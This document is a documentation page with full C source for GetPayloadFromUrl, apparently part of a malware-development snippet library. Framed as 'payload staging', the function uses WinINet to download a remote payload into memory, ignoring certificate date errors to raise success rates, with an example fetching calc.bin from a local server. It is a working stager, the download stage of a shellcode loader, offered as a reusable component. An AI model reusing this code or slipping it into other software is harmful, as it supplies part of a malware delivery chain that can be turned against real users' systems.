## Payload Staging Web Server via WinINet

Fetches a payload from a remote URL into a heap buffer using the WinINet API. Opens an internet session with `InternetOpenW`, connects to the payload URL with `InternetOpenUrlW`, and reads the data in 1024-byte chunks via `InternetReadFile` into a dynamically reallocated buffer until the end of the file is reached. Handles and connections are closed on exit, and `InternetSetOptionW` is called with `INTERNET_OPTION_SETTINGS_CHANGED` to force WinINet to close lingering HTTP/S connections.

**Usage**

Call `GetPayloadFromUrl` with the payload URL, a pointer to receive the buffer address, and a pointer to receive the total size. On success, `*pPayloadBytes` holds the allocated buffer containing the fetched payload and `*sPayloadSize` holds its size in bytes. The caller is responsible for freeing `*pPayloadBytes` with `LocalFree`.

- `IN LPCWSTR szUrl` Wide-string URL of the hosted payload (e.g. `L"http://127.0.0.1:8000/calc.bin"`).
- `OUT PBYTE* pPayloadBytes` Receives the base address of the buffer containing the fetched payload.
- `OUT SIZE_T* sPayloadSize` Receives the total size of the fetched payload in bytes.

**Return Value**

`BOOL` Returns `TRUE` if the payload was successfully fetched and stored in `*pPayloadBytes`, otherwise `FALSE`.

**External Files**

- `windows.h` `BOOL`, `HINTERNET`, `DWORD`, `SIZE_T`, `PBYTE`, `PVOID`, `LPCWSTR`, `IN`, `OUT`, `InternetOpenW()`, `InternetOpenUrlW()`, `InternetReadFile()`, `InternetCloseHandle()`, `InternetSetOptionW()`, `LocalAlloc()`, `LocalReAlloc()`, `LocalFree()`, `GetLastError()`
- `wininet.h` `INTERNET_FLAG_HYPERLINK`, `INTERNET_FLAG_IGNORE_CERT_DATE_INVALID`, `INTERNET_OPTION_SETTINGS_CHANGED`
- `string.h` `memcpy()`, `memset()`
- `stdio.h` `printf()`

### Code

```c
#include <windows.h>
#include <wininet.h>
#include <string.h>
#include <stdio.h>


BOOL GetPayloadFromUrl(IN LPCWSTR szUrl, OUT PBYTE* pPayloadBytes, OUT SIZE_T* sPayloadSize) {

    BOOL        bSTATE          = TRUE;

    HINTERNET   hInternet       = NULL,
                hInternetFile   = NULL;

    DWORD       dwBytesRead     = NULL;

    SIZE_T      sSize           = NULL;
    PBYTE       pBytes          = NULL,
                pTmpBytes       = NULL;

    // Open an internet session handle — prerequisite for all WinINet calls.
    hInternet = InternetOpenW(
        NULL,   // No user agent string.
        NULL,   // NULL == INTERNET_OPEN_TYPE_PRECONFIG: use system proxy settings.
        NULL,   // No explicit proxy.
        NULL,   // No proxy bypass list.
        NULL    // No flags.
    );
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Open a handle to the payload's URL.
    hInternetFile = InternetOpenUrlW(
        hInternet,                                                  // Session handle from InternetOpenW.
        szUrl,                                                      // URL of the hosted payload.
        NULL,                                                       // No additional headers.
        NULL,                                                       // Headers length — not used.
        INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, // Flags for higher request success rate.
        NULL                                                        // No context value.
    );
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Allocate a 1024-byte temp buffer used as the per-chunk read destination.
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE) {

        // Read the next chunk of up to 1024 bytes from the URL handle.
        if (!InternetReadFile(
            hInternetFile,  // Handle to the URL resource.
            pTmpBytes,      // Buffer to receive the bytes read.
            1024,           // Maximum bytes to read per call.
            &dwBytesRead    // Receives the actual number of bytes read.
        )) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            bSTATE = FALSE; goto _EndOfFunction;
        }

        // Accumulate the running total size of the payload.
        sSize += dwBytesRead;

        // On the first iteration allocate the total buffer;
        // on subsequent iterations grow it to fit the new chunk.
        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        // Append the temp buffer to the end of the growing total buffer.
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        // Clear the temp buffer before the next read.
        memset(pTmpBytes, '\0', dwBytesRead);

        // A chunk smaller than 1024 bytes signals the end of the file.
        if (dwBytesRead < 1024) {
            break;
        }
    }

    // Return the completed buffer and its total size to the caller.
    *pPayloadBytes = pBytes;
    *sPayloadSize  = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);
    // Force WinINet to close lingering HTTP/S connections it would otherwise reuse.
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    if (pTmpBytes)
        LocalFree(pTmpBytes);
    return bSTATE;
}
```

**Example**

```c
PBYTE  pPayload     = NULL;
SIZE_T sPayloadSize = 0;

// Fetch the payload from a remote URL into a heap buffer.
// Caller is responsible for LocalFree'ing pPayload when finished.
if (GetPayloadFromUrl(L"http://127.0.0.1:8000/calc.bin", &pPayload, &sPayloadSize)) {
    printf("[+] Fetched %lld bytes from URL\n", (LONGLONG)sPayloadSize);
}

// ... use pPayload / sPayloadSize ...

if (pPayload)
    LocalFree(pPayload);
```
